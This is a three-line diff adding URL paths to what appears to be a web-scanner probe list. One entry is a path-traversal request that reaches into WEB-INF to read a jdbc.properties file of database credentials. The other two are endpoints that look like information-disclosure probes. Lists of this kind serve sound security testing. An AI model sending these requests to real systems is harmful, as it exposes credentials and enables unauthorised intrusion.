@@ -1,0 +1,3 @@
+/servlet/ShowImageServlet?imagePath=../web/fe.war/WEB-INF/classes/jdbc.properties&print
+/Org/service/Service.asmx/GetUserXml4GEPS
+/cgi-bin/gateway/agentinfo
